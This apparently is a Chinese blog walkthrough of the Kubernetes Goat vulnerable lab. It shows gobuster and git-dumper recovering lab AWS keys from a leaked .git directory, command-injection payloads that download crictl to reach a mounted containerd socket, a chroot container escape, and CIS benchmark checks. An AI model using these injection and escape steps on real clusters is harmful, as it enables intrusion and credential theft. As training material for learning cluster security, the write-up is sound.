{"title":"kubernetes-goat靶场","uid":"018a2a8f1c82adfd1221467a2a861fc0","slug":"kubernetes-goat靶场","date":"2025-05-20T12:33:38.723Z","updated":"2025-05-22T16:48:57.060Z","comments":true,"path":"api/articles/kubernetes-goat靶场.json","cover":"https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/c160b854-1f3c-4901-9990-093288ad1c04.jpg","content":"<h1 id=\"kubernetes-goat靶场\"><a href=\"#kubernetes-goat靶场\" class=\"headerlink\" title=\"kubernetes-goat靶场\"></a>kubernetes-goat靶场</h1><p>Kubernetes Goat 被设计成一个故意设置易受攻击的集群环境，用于学习和实践 Kubernetes 安全性</p>\n<p>安装：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">git clone https://github.com/madhuakula/kubernetes-goat.git</span><br><span class=\"line\">cd kubernetes-goat</span><br><span class=\"line\">chmod +x setup-kubernetes-goat.sh</span><br><span class=\"line\">bash setup-kubernetes-goat.sh</span><br></pre></td></tr></table></figure>\n<p>运行访问脚本之前，确保 Pod 正在运行</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl get pods</span><br></pre></td></tr></table></figure>\n<p>通过以下命令将资源公开到本地系统（端口转发）来访问 </p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">bash access-kubernetes-goat.sh</span><br></pre></td></tr></table></figure>\n<h2 id=\"场景\"><a href=\"#场景\" class=\"headerlink\" title=\"场景\"></a>场景</h2><ul>\n<li>1.代码库中的敏感密钥</li>\n<li>2.IND（docker-in-docker）利用</li>\n<li>3.Kubernetes（K8S）世界中的SSRF</li>\n<li>4.容器逃逸到主机系统</li>\n<li>5.Docker CIS 基准分析</li>\n<li>6.Kubernetes CIS 基准分析</li>\n<li>7.攻击私人注册中心</li>\n<li>8.NodePort 暴露服务</li>\n<li>9.使用 Helm v2 Tiller 来攻克集群 - [已弃用]</li>\n<li>10.分析加密货币矿工容器</li>\n<li>11.Kubernetes 命名空间绕过</li>\n<li>12.获取环境信息</li>\n<li>13.对内存&#x2F;CPU 资源进行 DoS</li>\n<li>14.黑客容器预览</li>\n<li>15.层层隐藏</li>\n<li>16.RBAC 最小权限配置错误</li>\n<li>17.KubeAudit - 审计 Kubernetes 集群</li>\n<li>18.Falco - 运行时安全监控和检测</li>\n<li>19.Popeye - Kubernetes 集群清理工具</li>\n<li>20.使用 NSP 保护网络边界</li>\n<li>21.Cilium Tetragon - 基于 eBPF 的安全可观察性和运行时执行</li>\n<li>22.使用 Kyverno 策略引擎保护 Kubernetes 集群</li>\n</ul>\n<p>参考：<a href=\"https://madhuakula.com/kubernetes-goat\">https://madhuakula.com/kubernetes-goat</a></p>\n<h2 id=\"一，代码库中的敏感密钥\"><a href=\"#一，代码库中的敏感密钥\" class=\"headerlink\" title=\"一，代码库中的敏感密钥\"></a>一，代码库中的敏感密钥</h2><h3 id=\"方法一\"><a href=\"#方法一\" class=\"headerlink\" title=\"方法一\"></a>方法一</h3><p>开发人员倾向于将敏感信息提交给版本控制系统。当我们转向 CI&#x2F;CD 和 GitOps 系统时，我们往往会忘记识别代码和提交中的敏感信息。让我们看看能不能在这里找到一些很酷的东西！<br>访问1230端口。</p>\n<p><img src=\"https://myhaoblog.oss-cn-beijing.aliyuncs.com/k8s/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-05-20%20204507.png\"></p>\n<p>使用gobuster爆破目录，找到&#x2F;.git&#x2F;HEAD</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[/tmp]</span><br><span class=\"line\">└─# gobuster dir -w /usr/share/wordlists/dirb/common.txt -t 30 -u http://127.0.0.1:1230</span><br><span class=\"line\">===============================================================</span><br><span class=\"line\">Gobuster v3.1.0</span><br><span class=\"line\">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class=\"line\">===============================================================</span><br><span class=\"line\">[+] Url:                     http://192.168.32.130:1230</span><br><span class=\"line\">[+] Method:                  GET</span><br><span class=\"line\">[+] Threads:                 30</span><br><span class=\"line\">[+] Wordlist:                /usr/share/wordlists/dirb/common.txt</span><br><span class=\"line\">[+] Negative Status codes:   404</span><br><span class=\"line\">[+] User Agent:              gobuster/3.1.0</span><br><span class=\"line\">[+] Timeout:                 10s</span><br><span class=\"line\">===============================================================</span><br><span class=\"line\">/.git/HEAD            (Status: 200) [Size: 23]</span><br><span class=\"line\">/ping                 (Status: 200) [Size: 4] </span><br></pre></td></tr></table></figure>\n<p>使用git-dumper下载源码</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">git-dumper http://192.168.200.143:1230/ k8s</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(kali㉿kali)-[~]</span><br><span class=\"line\">└─$ git-dumper http://192.168.200.143:1230/ k8s</span><br><span class=\"line\">[-] Testing http://192.168.200.143:1230/.git/HEAD [200]</span><br><span class=\"line\">[-] Testing http://192.168.200.143:1230/.git/ [404]</span><br><span class=\"line\">[-] Fetching common files</span><br><span class=\"line\">[-] Fetching http://192.168.200.143:1230/.gitignore [404]</span><br><span class=\"line\">[-] http://192.168.200.143:1230/.gitignore responded with status code 404</span><br><span class=\"line\">[-] Fetching http://192.168.200.143:1230/.git/hooks/post-commit.sample [404]</span><br></pre></td></tr></table></figure>\n<p>进入下载的 git 存储库文件夹进行分析</p>\n<p>我们可以通过查看日志和以前的提交历史来验证 git 历史记录和信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(kali㉿kali)-[~/k8s]</span><br><span class=\"line\">└─$ git log                                    </span><br><span class=\"line\">commit 905dcec070d86ce60822d790492d7237884df60a (HEAD -&gt; master)</span><br><span class=\"line\">Author: Madhu Akula &lt;madhu.akula@hotmail.com&gt;</span><br><span class=\"line\">Date:   Fri Nov 6 23:42:28 2020 +0100</span><br><span class=\"line\"></span><br><span class=\"line\">    Final release</span><br><span class=\"line\"></span><br><span class=\"line\">commit 3292ff3bd8d96f192a9d4eb665fdd1014d87d3df</span><br><span class=\"line\">Author: Madhu Akula &lt;madhu.akula@hotmail.com&gt;</span><br><span class=\"line\">Date:   Fri Nov 6 23:40:59 2020 +0100</span><br><span class=\"line\"></span><br><span class=\"line\">    Updated the docs</span><br><span class=\"line\"></span><br><span class=\"line\">commit 7daa5f4cda812faa9c62966ba57ee9047ee6b577</span><br><span class=\"line\">Author: Madhu Akula &lt;madhu.akula@hotmail.com&gt;</span><br><span class=\"line\">Date:   Fri Nov 6 23:39:21 2020 +0100</span><br><span class=\"line\"></span><br><span class=\"line\">    updated the endpoints and routes</span><br><span class=\"line\"></span><br><span class=\"line\">commit d7c173ad183c574109cd5c4c648ffe551755b576</span><br><span class=\"line\">Author: Madhu Akula &lt;madhu.akula@hotmail.com&gt;</span><br><span class=\"line\">Date:   Fri Nov 6 23:31:06 2020 +0100</span><br><span class=\"line\"></span><br><span class=\"line\">    Inlcuded custom environmental variables</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">commit d7c173ad183c574109cd5c4c648ffe551755b576</span><br><span class=\"line\">Author: Madhu Akula &lt;madhu.akula@hotmail.com&gt;</span><br><span class=\"line\">Date:   Fri Nov 6 23:31:06 2020 +0100</span><br><span class=\"line\"></span><br><span class=\"line\">    Inlcuded custom environmental variables</span><br></pre></td></tr></table></figure>\n<p>出现一个有意思的内容</p>\n<p>可以使用以下命令，并输入提交 ID 来查看某个提交</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">git checkout d7c173ad183c574109cd5c4c648ffe551755b576</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(kali㉿kali)-[~/k8s]</span><br><span class=\"line\">└─$ git checkout d7c173ad183c574109cd5c4c648ffe551755b576</span><br><span class=\"line\">Note: switching to &#x27;d7c173ad183c574109cd5c4c648ffe551755b576&#x27;.</span><br><span class=\"line\"></span><br><span class=\"line\">You are in &#x27;detached HEAD&#x27; state. You can look around, make experimental</span><br><span class=\"line\">changes and commit them, and you can discard any commits you make in this</span><br><span class=\"line\">state without impacting any branches by switching back to a branch.</span><br><span class=\"line\"></span><br><span class=\"line\">If you want to create a new branch to retain commits you create, you may</span><br><span class=\"line\">do so (now or later) by using -c with the switch command. Example:</span><br><span class=\"line\"></span><br><span class=\"line\">  git switch -c &lt;new-branch-name&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">Or undo this operation with:</span><br><span class=\"line\"></span><br><span class=\"line\">  git switch -</span><br><span class=\"line\"></span><br><span class=\"line\">Turn off this advice by setting config variable advice.detachedHead to false</span><br><span class=\"line\"></span><br><span class=\"line\">HEAD is now at d7c173a Inlcuded custom environmental variables</span><br></pre></td></tr></table></figure>\n\n<p>现在我们进入了特定的提交历史记录，可以看到该提交中的所有文件、代码、资源和更改。我们可以使用标准的 Linux 实用程序来探索文件系统，看看是否有任何有趣的文件或更改</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">ls -la</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(kali㉿kali)-[~/k8s]</span><br><span class=\"line\">└─$ ls -la</span><br><span class=\"line\">total 32</span><br><span class=\"line\">drwxrwxr-x  3 kali kali 4096 May 22 00:05 .</span><br><span class=\"line\">drwx------ 17 kali kali 4096 May 22 00:01 ..</span><br><span class=\"line\">-rw-rw-r--  1 kali kali  182 May 22 00:05 .env</span><br><span class=\"line\">drwxrwxr-x  7 kali kali 4096 May 22 00:05 .git</span><br><span class=\"line\">-rw-rw-r--  1 kali kali   76 May 22 00:05 go.mod</span><br><span class=\"line\">-rw-rw-r--  1 kali kali 2432 May 22 00:05 go.sum</span><br><span class=\"line\">-rw-rw-r--  1 kali kali  284 May 22 00:05 main.go</span><br><span class=\"line\">-rw-rw-r--  1 kali kali   95 May 22 00:05 README.md</span><br></pre></td></tr></table></figure>\n<p>现在我们可以看到一个有趣的点文件，它看起来相当可疑，因为大多数开发人员将环境变量和密钥存储在类似的文件中</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">cat .env</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(kali㉿kali)-[~/k8s]</span><br><span class=\"line\">└─$ cat .env</span><br><span class=\"line\">[build-code-aws]</span><br><span class=\"line\">aws_access_key_id = AKIVSHD6243H22G1KIDC</span><br><span class=\"line\">aws_secret_access_key = cgGn4+gDgnriogn4g+34ig4bg34g44gg4Dox7c1M</span><br><span class=\"line\">k8s_goat_flag = k8s-goat-51bc78332065561b0c99280f62510bcc</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"方法二\"><a href=\"#方法二\" class=\"headerlink\" title=\"方法二\"></a>方法二</h3><p>有时，理想情况下，我们可以访问 Pod、容器，作为审计的一部分，或者由于其他一些漏洞，我们也可以使用不同的方法来解决或实现这一</p>\n<p>我们可以使用以下命令exec进入 pod</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">export POD_NAME=$(kubectl get pods --namespace default -l &quot;app=build-code&quot; -o jsonpath=&quot;&#123;.items[0].metadata.name&#125;&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">kubectl exec -it $POD_NAME -- sh</span><br></pre></td></tr></table></figure>\n\n<p><strong>提示：</strong>我们可以使用TruffleHog等开源实用程序而不是手动分析来在 git 提交&#x2F;历史记录中找到泄露的凭据。</p>\n<p>它包含.git文件夹，我们可以trufflehog通过运行以下命令来执行分析</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">trufflehog .</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Docker-in-Docker的漏洞利用\"><a href=\"#Docker-in-Docker的漏洞利用\" class=\"headerlink\" title=\"Docker-in-Docker的漏洞利用\"></a>Docker-in-Docker的漏洞利用</h2><ul>\n<li>将学习测试和利用容器 UNIX 套接字错误配置</li>\n<li>能够利用容器并从docker容器中逃逸</li>\n</ul>\n<p>此场景的目标是从正在运行的 docker 容器中跳转到运行该容器的主机系统，并能够访问在同一节点上运行的其他容器并对其执行操作。<br><img src=\"https://myhaoblog.oss-cn-beijing.aliyuncs.com/k8s/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-05-22%20003003.png\"></p>\n<p>通过查看应用程序功能并尝试输入和输出，我们发现它存在标准命令注入漏洞。假设它在 Linux 容器中运行，我们可以使用;分隔符来运行&#x2F;传递其他命令。</p>\n<h3 id=\"方法一-1\"><a href=\"#方法一-1\" class=\"headerlink\" title=\"方法一\"></a>方法一</h3><p>大多数使用Docker和在管道中为构建容器的CI &#x2F; CD和管道系统使用称为DIND(docker-in-docker)。在这种情况下,我们尝试利用并访问主机系统。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">127.0.0.1; id</span><br></pre></td></tr></table></figure>\n<p>我们可以看到它返回了命令的响应id，现在我们可以分析系统并查看可以获得哪些潜在信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">; mount</span><br></pre></td></tr></table></figure>\n<p>它包含containerd.sock安装到文件系统中，因为它在标准系统中并不常见<br><img src=\"https://myhaoblog.oss-cn-beijing.aliyuncs.com/k8s/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-05-22%20003447.png\"></p>\n<p>我们可以看到它&#x2F;custom&#x2F;containerd&#x2F;containerd.sock已挂载在文件系统中，假设它是从主机系统挂载的，我们需要与它进行通信，以便与 UNIX 套接字进行通信</p>\n<p>我们可以使用多种方法与 UNIX 套接字通信containerd.sock。其中一些包括crictl 二进制文件，或者一个简单的curl程序。</p>\n<p>我们可以crictl从互联网上下载静态二进制文件<a href=\"https://github.com/kubernetes-sigs/cri-tools/releases%E3%80%82\">https://github.com/kubernetes-sigs/cri-tools/releases。</a><br>为了确定我们需要哪个二进制文件，我们可以运行以下命令进行系统发现</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">;uname -a</span><br></pre></td></tr></table></figure>\n<p>我们可以检查输出以确定系统架构和操作系统，然后将相应的二进制文件下载到容器中。例如，如果我们的目标系统是 x86_64 Linux 系统，我们可以使用以下命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">;uname -a</span><br><span class=\"line\">Response Output</span><br><span class=\"line\"></span><br><span class=\"line\">Linux health-check-deployment-7f4fc7c947-tw6cs 6.12.0-82.el10.x86_64 #1 SMP PREEMPT_DYNAMIC Wed May 7 19:48:55 UTC 2025 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">;wget https://github.com/kubernetes-sigs/cri-tools/releases/download/v1.27.1/crictl-v1.27.1-linux-amd64.tar.gz -O /tmp/crictl-v1.27.1.tar.gz</span><br></pre></td></tr></table></figure>\n\n<p>我们可以从文件中提取二进制文件，crictl-v1.27.1.tgz以便我们可以使用它与 UNIX 套接字进行通信</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">;tar -xvf /tmp/crictl-v1.27.1.tar.gz -C /tmp/</span><br></pre></td></tr></table></figure>\n<p>现在我们可以通过运行以下 crictl 命令并传递containerd.sockUNIX 套接字来访问主机系统</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">;/tmp/crictl -r unix:///custom/containerd/containerd.sock images</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://myhaoblog.oss-cn-beijing.aliyuncs.com/k8s/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-05-22%20215842.png\"><br>执行命令后，可以看到主机系统中有很多容器镜像。我们可以使用不同的 crictl 命令来获得更多访问权限并进一步利用。</p>\n<p><img src=\"https://myhaoblog.oss-cn-beijing.aliyuncs.com/k8s/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-05-22%20222111.png\"></p>\n<h2 id=\"Kubernetes（K8S）中的SSRF\"><a href=\"#Kubernetes（K8S）中的SSRF\" class=\"headerlink\" title=\"Kubernetes（K8S）中的SSRF\"></a>Kubernetes（K8S）中的SSRF</h2><p>在场景结束时，我们将理解并学习以下内容</p>\n<ul>\n<li>如何利用云环境中应用程序中的 SSRF 漏洞</li>\n<li>了解元数据查询功能以获取云提供商数据的访问权限</li>\n<li>理解并利用 Kubernetes 原生服务发现功能和服务 DNS 查询</li>\n<li>访问集群环境内的内部微服务</li>\n</ul>\n<h2 id=\"容器逃逸到主机系统\"><a href=\"#容器逃逸到主机系统\" class=\"headerlink\" title=\"容器逃逸到主机系统\"></a>容器逃逸到主机系统</h2><p>在本场景结束时，您将理解并学习以下内容：</p>\n<ul>\n<li>能够利用容器并从docker容器中逃逸</li>\n<li>您将学习测试和利用配置错误和特权容器</li>\n<li>了解容器、Kubernetes 和集群环境中的常见配置错误及其可能造成的损害<br>使用mount查看挂载信息</li>\n</ul>\n<p><img src=\"https://myhaoblog.oss-cn-beijing.aliyuncs.com/k8s/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-05-22%20230330.png\"><br>查看&#x2F;host-system<br><img src=\"https://myhaoblog.oss-cn-beijing.aliyuncs.com/k8s/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-05-22%20230543.png\"></p>\n<p>将当前系统的根目录更改为 “&#x2F;host-system”。这意味着系统将认为 “&#x2F;host-system” 是根目录，并且所有的相对路径都是从 “&#x2F;host-system” 开始的。执行 “chroot &#x2F;host-system bash” 后，您将进入到一个以 “&#x2F;host-system” 为根目录的新环境，并且可以在其中运行 bash。<br>使用以下方式获取主机系统权限chroot</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">chroot /host-system bash</span><br></pre></td></tr></table></figure>\n\n<p>执行docker ps<br>使用kubectl获取pods信息</p>\n<h2 id=\"Docker-CIS-基准分析\"><a href=\"#Docker-CIS-基准分析\" class=\"headerlink\" title=\"Docker CIS 基准分析\"></a>Docker CIS 基准分析</h2><p>这种情况主要是在Kubernetes节点之上执行Docker CIS基准分析,以识别可能的安全漏洞。</p>\n<p>运行服务</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl apply -f scenarios/docker-bench-security/deployment.yaml</span><br></pre></td></tr></table></figure>\n<p>运行容器应用</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">root@l-virtual-machine:/opt/kubernetes-goat# kubectl get pods</span><br><span class=\"line\">NAME                                               READY   STATUS              RESTARTS   AGE</span><br><span class=\"line\">batch-check-job-t6mnv                              0/1     Completed           0          6d20h</span><br><span class=\"line\">build-code-deployment-7d8969f879-hf88j             1/1     Running             2          6d20h</span><br><span class=\"line\">docker-bench-security-6npjf                        0/1     ContainerCreating   0          61s</span><br><span class=\"line\">health-check-deployment-fbc7964bc-5l6sx            1/1     Running             2          6d20h</span><br><span class=\"line\">hidden-in-layers-9tld6                             1/1     Running             0          136m</span><br><span class=\"line\">internal-proxy-deployment-5489c8b584-72mhp         2/2     Running             0          123m</span><br><span class=\"line\">kubernetes-goat-home-deployment-655d88c69f-lzb9s   1/1     Running             2          6d20h</span><br><span class=\"line\">metadata-db-86d59569fc-nbtx2                       1/1     Running             2          6d20h</span><br><span class=\"line\">poor-registry-deployment-597b9fb599-tfdzq          1/1     Running             2          6d20h</span><br><span class=\"line\">system-monitor-deployment-5678ccfbc9-tqxsb         1/1     Running             2          6d20h</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl exec -it docker-bench-security-6npjf  -- sh</span><br></pre></td></tr></table></figure>\n<p>执行docker CIS基线分析脚本</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">~ # cd docker-bench-security/</span><br><span class=\"line\">~/docker-bench-security # bash docker-bench-security.sh</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"K8S-CIS基线分析\"><a href=\"#K8S-CIS基线分析\" class=\"headerlink\" title=\"K8S CIS基线分析\"></a>K8S CIS基线分析</h2><p>运行服务</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl apply -f scenarios/kube-bench-security/node-job.yaml</span><br><span class=\"line\">kubectl apply -f scenarios/kube-bench-security/master-job.yaml</span><br></pre></td></tr></table></figure>\n<p>它是一个检测任务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">root@l-virtual-machine:~# kubectl get jobs</span><br><span class=\"line\">NAME                COMPLETIONS   DURATION   AGE</span><br><span class=\"line\">batch-check-job     1/1           37s        6d20h</span><br><span class=\"line\">hidden-in-layers    0/1           160m       160m</span><br><span class=\"line\">kube-bench-master   1/1           4m33s      22m</span><br><span class=\"line\">kube-bench-node     1/1           4m34s      22m</span><br></pre></td></tr></table></figure>\n<p>查看日志，可以看到K8S基线情况。</p>\n","text":"kubernetes-goat靶场Kubernetes Goat 被设计成一个故意设置易受攻击的集群环境，用于学习和实践 Kubernetes 安全性 安装： ...","permalink":"/post/kubernetes-goat靶场","photos":[],"count_time":{"symbolsCount":"9k","symbolsTime":"8 mins."},"categories":[{"name":"靶场","slug":"靶场","count":1,"path":"api/categories/靶场.json"}],"tags":[{"name":"靶场","slug":"靶场","count":1,"path":"api/tags/靶场.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#kubernetes-goat%E9%9D%B6%E5%9C%BA\"><span class=\"toc-text\">kubernetes-goat靶场</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%9C%BA%E6%99%AF\"><span class=\"toc-text\">场景</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%B8%80%EF%BC%8C%E4%BB%A3%E7%A0%81%E5%BA%93%E4%B8%AD%E7%9A%84%E6%95%8F%E6%84%9F%E5%AF%86%E9%92%A5\"><span class=\"toc-text\">一，代码库中的敏感密钥</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%96%B9%E6%B3%95%E4%B8%80\"><span class=\"toc-text\">方法一</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%96%B9%E6%B3%95%E4%BA%8C\"><span class=\"toc-text\">方法二</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Docker-in-Docker%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8\"><span class=\"toc-text\">Docker-in-Docker的漏洞利用</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%96%B9%E6%B3%95%E4%B8%80-1\"><span class=\"toc-text\">方法一</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Kubernetes%EF%BC%88K8S%EF%BC%89%E4%B8%AD%E7%9A%84SSRF\"><span class=\"toc-text\">Kubernetes（K8S）中的SSRF</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E5%88%B0%E4%B8%BB%E6%9C%BA%E7%B3%BB%E7%BB%9F\"><span class=\"toc-text\">容器逃逸到主机系统</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Docker-CIS-%E5%9F%BA%E5%87%86%E5%88%86%E6%9E%90\"><span class=\"toc-text\">Docker CIS 基准分析</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#K8S-CIS%E5%9F%BA%E7%BA%BF%E5%88%86%E6%9E%90\"><span class=\"toc-text\">K8S CIS基线分析</span></a></li></ol></li></ol>","author":{"name":"Hao","slug":"blog-author","avatar":"https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/64966b30e1c9375e8dbb11146ea9c12f.jpg","link":"/","description":"山高自有客行路，水深自有渡船认 The future is like the sea and three will be a long time to come","socials":{"github":"https://github.com/isMyHao","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/","csdn":"https://blog.csdn.net/2401_87971103?spm=1000.2115.3001.10640","juejin":"","customs":{}}},"mapped":true,"hidden":false,"prev_post":{"title":"Poc开发-yml语法","uid":"398f1633e25e991ed31599b8f1b3abe2","slug":"漏洞发现-yml语法","date":"2025-05-21T07:46:31.480Z","updated":"2025-05-21T15:59:57.166Z","comments":true,"path":"api/articles/漏洞发现-yml语法.json","cover":"https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/e6d0930a-5ea5-4a58-9282-8a97feff4efa.jpg","text":"Poc开发-yml语法参考文章：https://docs.nuclei.sh/template-guide/introductionhttps://blog.c...","permalink":"/post/漏洞发现-yml语法","photos":[],"count_time":{"symbolsCount":"2k","symbolsTime":"2 mins."},"categories":[{"name":"漏洞发现","slug":"漏洞发现","count":1,"path":"api/categories/漏洞发现.json"}],"tags":[{"name":"漏洞发现","slug":"漏洞发现","count":1,"path":"api/tags/漏洞发现.json"}],"author":{"name":"Hao","slug":"blog-author","avatar":"https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/64966b30e1c9375e8dbb11146ea9c12f.jpg","link":"/","description":"山高自有客行路，水深自有渡船认 The future is like the sea and three will be a long time to come","socials":{"github":"https://github.com/isMyHao","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/","csdn":"https://blog.csdn.net/2401_87971103?spm=1000.2115.3001.10640","juejin":"","customs":{}}}},"next_post":{"title":"云攻防-K8S搭建","uid":"057dca3af5aa739fb2629cb762787844","slug":"云攻防-k8s搭建","date":"2025-05-17T09:03:45.056Z","updated":"2025-05-21T14:29:04.246Z","comments":true,"path":"api/articles/云攻防-k8s搭建.json","cover":"https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/07d4681d-b7f1-4d6f-b718-c01399944150.jpg","text":"云攻防-k8s手动搭建参考视频：https://www.bilibili.com/video/BV1P17fzBES1?spm_id_from=333.788....","permalink":"/post/云攻防-k8s搭建","photos":[],"count_time":{"symbolsCount":"8.8k","symbolsTime":"8 mins."},"categories":[{"name":"云安全","slug":"云安全","count":3,"path":"api/categories/云安全.json"}],"tags":[{"name":"云安全","slug":"云安全","count":3,"path":"api/tags/云安全.json"}],"author":{"name":"Hao","slug":"blog-author","avatar":"https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/64966b30e1c9375e8dbb11146ea9c12f.jpg","link":"/","description":"山高自有客行路，水深自有渡船认 The future is like the sea and three will be a long time to come","socials":{"github":"https://github.com/isMyHao","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/","csdn":"https://blog.csdn.net/2401_87971103?spm=1000.2115.3001.10640","juejin":"","customs":{}}}}}